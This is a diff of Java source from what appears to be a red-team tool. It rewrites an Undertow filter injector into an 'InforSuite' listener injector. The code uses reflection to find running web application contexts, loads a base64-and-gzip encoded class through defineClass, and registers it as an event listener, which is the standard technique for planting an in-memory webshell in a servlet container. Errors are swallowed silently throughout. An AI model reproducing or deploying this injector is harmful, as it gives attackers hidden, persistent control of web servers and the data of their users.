@@ -1,25 +1,17 @@
 package com.potato.potatotool.content.redTeam.memshell.injector;
 
-import javax.servlet.DispatcherType;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.EventListener;
 import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 import java.util.zip.GZIPInputStream;
 
 
-public class UndertowFilterInjector {
-
-    public String getUrlPattern() {
-        return "/*";
-    }
-
+public class InforSuiteListenerInjector {
 
     public String getClassName() {
         return "";
@@ -27,96 +19,86 @@ public class UndertowFilterInjector {
 
     public String getBase64String() throws IOException {
         return "";
-    }
+}
 
     static {
-        new UndertowFilterInjector();
+        new InforSuiteListenerInjector();
     }
 
-
-    public UndertowFilterInjector() {
+    public InforSuiteListenerInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object filter = getFilter(context);
-                addFilter(context, filter);
+                Object listener = getListener(context);
+                addListener(context, listener);
             }
         } catch (Exception ignored) {
 
         }
 
-
     }
 
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        for (int i = 0; i < threads.length; i++) {
-            try {
-                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
-                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
-                if (servletContext != null)
-                    contexts.add(servletContext);
-            } catch (Exception ignored) {
+    public List<Object> getContext() throws Exception {
+        List<Object> contexts = new ArrayList();
+        Thread[] threads = getThreads();
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            Object context = children.get(key1);
+                            if (context != null) contexts.add(context);
+                        }
+                    }
+                }
             }
+        } catch (Exception ignored) {
         }
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+    public Thread[] getThreads() throws Exception {
+        Thread[] var0 = null;
+
         try {
-            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
-        } catch (Exception ignored) {
-            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-            return (ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null);
+            var0 = (Thread[])(invokeMethod(Thread.class, "getThreads"));
+        } catch (NoSuchMethodException var3) {
+            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
+            var0 = new Thread[var2.activeCount()];
+            var2.enumerate(var0);
         }
+
+        return var0;
     }
 
-    private Object getFilter(Object context) throws Exception {
-        Object filter = null;
-        ClassLoader classLoader = getWebAppClassLoader(context);
+    private Object getListener(Object context) throws Exception {
+        ClassLoader classLoader = (ClassLoader) getFV(getFV(context, "loader"), "classLoader");
+        Object listener = null;
         try {
-            filter = classLoader.loadClass(getClassName()).newInstance();
+            listener = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                 defineClass.setAccessible(true);
                 Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                filter = clazz.newInstance();
-            } catch (Throwable tt) {
+                listener = clazz.newInstance();
+            } catch (Exception ignored) {
             }
+
         }
-        return filter;
+        return listener;
     }
 
-    public void addFilter(Object context, Object filter) {
-        String filterClassName = filter.getClass().getName();
+    public void addListener(Object context, Object listener) throws Exception {
         try {
-            if (isInjected(context, filterClassName)) {
-                return;
-            }
-            Class filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
-            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
-            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            Object deploymentImpl = getFieldValue(context, "deployment");
-            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
-            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, getUrlPattern(), DispatcherType.REQUEST});
-        } catch (Throwable e) {
-        }
-    }
+            List<EventListener> appEventListeners = (List<EventListener>) invokeMethod(context, "getApplicationEventListeners");
+            appEventListeners.add((EventListener) listener);
+        } catch (Exception ignored) {
 
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Map<String, Object> filters = (HashMap) getFieldValue(getFieldValue(context, "deploymentInfo"), "filters");
-        for (Map.Entry<String, Object> filter : filters.entrySet()) {
-            Class filterClass = (Class) getFieldValue(filter.getValue(), "filterClass");
-            if (filterClass.getName().equals(evilClassName)) {
-                return true;
-            }
         }
-        return false;
     }
 
 
@@ -144,13 +126,13 @@ public class UndertowFilterInjector {
         return out.toByteArray();
     }
 
-    static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj, fieldName);
+    static Object getFV(Object obj, String fieldName) throws Exception {
+        Field field = getF(obj, fieldName);
         field.setAccessible(true);
         return field.get(obj);
     }
 
-    static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
+    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
         Class<?> clazz = obj.getClass();
         while (clazz != null) {
             try {
@@ -163,7 +145,6 @@ public class UndertowFilterInjector {
         }
         throw new NoSuchFieldException(fieldName);
     }
-
 
     static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
         return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
